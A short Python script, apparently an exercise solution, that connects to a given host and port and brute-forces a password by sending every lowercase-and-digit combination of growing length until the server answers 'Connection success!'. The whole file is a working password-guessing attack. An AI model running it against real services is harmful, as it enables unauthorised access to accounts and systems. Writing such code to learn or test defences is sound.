# write your code here

import socket
from sys import argv
from itertools import product
from string import ascii_lowercase, digits

def main():

    if len(argv) == 1:
        print("Parameter list is empty")
        exit()
    elif len(argv) != 3:
        print("Length of parameter list is wrong")
        exit()

    hostname = argv[1]
    port = int(argv[2])
    #data = argv[3]

    buffer_size = 1024

    address = (hostname, port)

    with socket.socket() as client_socket:

        client_socket.connect(address)

        test_counter = 0
        pwd_len = 0
        pwd_character_pool = ascii_lowercase + digits


        exit_flag = False

        while not exit_flag and test_counter < 10 ** 6:

            pwd_len += 1

            for pwd_trial in product(pwd_character_pool, repeat=pwd_len):

                # generate attack data by brute force
                attack_data = ''.join(pwd_trial)

                # covert from string to byte
                data = attack_data.encode()

                # send data from client to server
                client_socket.send(data)

                # receive data from server to client
                response = client_socket.recv(buffer_size)

                # convert from byte to string
                response = response.decode()

                test_counter += 1

                #print(response)

                if response == 'Connection success!':
                    # output password in screen
                    print(attack_data)
                    exit_flag = True
                    break
                else:

                    #print(f'{test_counter} trial failed with {data}')

                    if test_counter >= 10 ** 6:
                        # out of limitation
                        exit_flag = True
                        break



    return



# Entry point of program
if __name__ == '__main__':

    main()
